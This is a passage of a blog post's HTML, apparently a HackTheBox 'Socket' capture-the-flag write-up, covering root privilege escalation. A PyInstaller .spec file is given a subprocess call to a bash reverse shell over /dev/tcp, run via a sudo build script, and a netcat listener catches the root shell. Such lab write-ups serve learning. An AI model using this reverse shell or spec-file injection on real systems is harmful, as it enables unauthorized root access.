+</span></span><span class="line"><span class="cl">    <span class="nv">noarchive</span><span class="o">=</span>False,
+</span></span><span class="line"><span class="cl"><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">pyz</span> <span class="o">=</span> PYZ<span class="o">(</span>a.pure, a.zipped_data, <span class="nv">cipher</span><span class="o">=</span>block_cipher<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">exe</span> <span class="o">=</span> EXE<span class="o">(</span>
+</span></span><span class="line"><span class="cl">    pyz,
+</span></span><span class="line"><span class="cl">    a.scripts,
+</span></span><span class="line"><span class="cl">    a.binaries,
+</span></span><span class="line"><span class="cl">    a.zipfiles,
+</span></span><span class="line"><span class="cl">    a.datas,
+</span></span><span class="line"><span class="cl">    <span class="o">[]</span>,
+</span></span><span class="line"><span class="cl">    <span class="nv">name</span><span class="o">=</span><span class="s1">&#39;qreader&#39;</span>,
+</span></span><span class="line"><span class="cl">    <span class="nv">debug</span><span class="o">=</span>False,
+</span></span><span class="line"><span class="cl">    <span class="nv">bootloader_ignore_signals</span><span class="o">=</span>False,
+</span></span><span class="line"><span class="cl">    <span class="nv">strip</span><span class="o">=</span>False,
+</span></span><span class="line"><span class="cl">    <span class="nv">upx</span><span class="o">=</span>True,
+</span></span><span class="line"><span class="cl">    <span class="nv">upx_exclude</span><span class="o">=[]</span>,
+</span></span><span class="line"><span class="cl">    <span class="nv">runtime_tmpdir</span><span class="o">=</span>None,
+</span></span><span class="line"><span class="cl">    <span class="nv">console</span><span class="o">=</span>True,
+</span></span><span class="line"><span class="cl">    <span class="nv">disable_windowed_traceback</span><span class="o">=</span>False,
+</span></span><span class="line"><span class="cl">    <span class="nv">argv_emulation</span><span class="o">=</span>False,
+</span></span><span class="line"><span class="cl">    <span class="nv">target_arch</span><span class="o">=</span>None,
+</span></span><span class="line"><span class="cl">    <span class="nv">codesign_identity</span><span class="o">=</span>None,
+</span></span><span class="line"><span class="cl">    <span class="nv">entitlements_file</span><span class="o">=</span>None,
+</span></span><span class="line"><span class="cl"><span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now that we have a proper <code>.spec</code> file, we can begin to make small changes that might allow us to execute actions as root.</p>
+<h3 id="subprocess-execution-in-pyinstaller-spec-file">Subprocess execution in pyinstaller .spec file</h3>
+<p>The pyinstaller documents appear to suggest this .spec file can also interpret python code. And so, I make a simple addition to it that will execute a <code>.sh</code> script and, in that script, I provide a simple reverse shell.</p>
+<p>rev.sh:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.101/18 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>At the top of the <code>.spec</code> file I include imports and a <code>popen</code> command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">tkeller</span><span class="nd">@socket</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="mi">1</span><span class="err">$</span> <span class="n">head</span> <span class="n">qreader</span><span class="o">.</span><span class="n">spec</span> 
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- mode: python ; coding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">block_cipher</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="s1">&#39;/tmp/rev.sh&#39;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">Analysis</span><span class="p">(</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now upon calling <code>build</code>, pyinstaller should invoke the .spec file and subsequently open my <code>rev.sh</code> as root, giving me an interactive session.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tkeller@socket:/tmp/$ sudo /usr/local/sbin/build-installer.sh build qreader.spec 
+</span></span><span class="line"><span class="cl"><span class="m">124</span> INFO: PyInstaller: 5.6.2
+</span></span><span class="line"><span class="cl"><span class="m">124</span> INFO: Python: 3.10.6
+</span></span><span class="line"><span class="cl"><span class="m">127</span> INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
+</span></span><span class="line"><span class="cl"><span class="m">130</span> INFO: UPX is not available.
+</span></span><span class="line"><span class="cl"><span class="m">131</span> INFO: Extending PYTHONPATH with paths
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s1">&#39;/tmp/&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl"><span class="m">8829</span> INFO: Building EXE from EXE-00.toc completed successfully.
+</span></span><span class="line"><span class="cl">tkeller@socket:/tmp$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Meanwhile in another terminal session:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -nvlp <span class="m">8001</span>                                            
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">8001</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.101<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.206<span class="o">]</span> <span class="m">37536</span>
+</span></span><span class="line"><span class="cl">root@socket:/tmp/1#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="reflection">Reflection</h2>
+<p>The difficulty of this box is primarily focused in the WebSocket interaction, true to the box name. The SQLi vulnerability can be easily missed, and without extra help, SQLMap can give a lot of problems as well. As a final hit to those manually exploiting, retrieving the password hash is not enough information to access the box. However, once this challenge is overcome, privilege escalation to root authority is much simpler and flexible.  I learned several new things on the box, in particular I appreciate learning about rayhan0x01&rsquo;s solution to using SQLMap for WebSocket tasks.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/sqli/">SQLi</a>
+        
+            <a href="/tags/python/">Python</a>
+        
+            <a href="/tags/websocket/">WebSocket</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox_inject/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox_inject/Inject.9f9716c1200516310e6e4cd98e20c139_hu12ac3957f7a126ac06ec9338f7d84355_333068_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox_Inject"
+                        
+                        data-hash="md5-n5cWwSAFFjEObkzZjiDBOQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox_Inject</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2023 Spencer&#39;s Blog
+    </section>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#initial-enumeration">Initial Enumeration</a>
+      <ol>
+        <li><a href="#examining-the-webpage">Examining the webpage</a></li>
+        <li><a href="#analyzing-the-qr-code-reader">Analyzing the QR Code Reader</a></li>
+        <li><a href="#examining-the-exposed-websocket">Examining the exposed WebSocket</a></li>
+      </ol>
+    </li>
+    <li><a href="#foothold">Foothold</a>
+      <ol>
+        <li><a href="#manual-enumeration-with-sqli-union-injections">Manual enumeration with SQLi UNION injections</a>
+          <ol>
+            <li><a href="#bonus-using-sqlmap-to-dump-the-database">Bonus: using SQLMap to dump the database</a></li>
+          </ol>
+        </li>
+        <li><a href="#authenticating-through-ssh">Authenticating through ssh</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ol>
+        <li><a href="#enumeration">Enumeration:</a></li>
+        <li><a href="#using-the-make-script-to-produce-a-spec-template">Using the <code>make</code> script to produce a .spec template</a></li>
+        <li><a href="#subprocess-execution-in-pyinstaller-spec-file">Subprocess execution in pyinstaller .spec file</a></li>
+      </ol>
+    </li>
+    <li><a href="#reflection">Reflection</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+
+    </body>
+</html>
